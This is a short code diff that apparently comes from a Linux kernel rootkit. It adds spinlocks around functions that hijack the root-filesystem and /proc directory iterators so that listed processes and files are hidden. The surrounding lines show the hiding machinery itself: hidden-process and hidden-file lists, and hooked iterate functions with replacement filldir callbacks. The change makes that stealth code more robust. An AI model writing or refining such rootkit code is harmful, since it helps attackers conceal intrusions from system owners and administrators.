@@ -31,6 +31,9 @@ struct n_subprocess_info
 LIST_HEAD(hidden_procs);
 LIST_HEAD(hidden_files);
 
+static DEFINE_SPINLOCK(proc_iterate_lock);
+static DEFINE_SPINLOCK(root_iterate_lock);
+
 static int (*proc_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 static int (*root_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
 
@@ -151,10 +154,12 @@ int n_root_iterate ( struct file *file, void *dirent, filldir_t filldir )
 {
     int ret;
 
+    spin_lock(&root_iterate_lock);
     root_filldir = filldir;
     hijack_pause(root_iterate);
     ret = root_iterate(file, dirent, n_root_filldir);
     hijack_resume(root_iterate);
+    spin_unlock(&root_iterate_lock);
 
     return ret;
 }
@@ -177,10 +182,12 @@ int n_proc_iterate ( struct file *file, void *dirent, filldir_t filldir )
 {
     int ret;
 
+    spin_lock(&proc_iterate_lock);
     proc_filldir = filldir;
     hijack_pause(proc_iterate);
     ret = proc_iterate(file, dirent, n_proc_filldir);
     hijack_resume(proc_iterate);
+    spin_unlock(&proc_iterate_lock);
 
     return ret;
 }
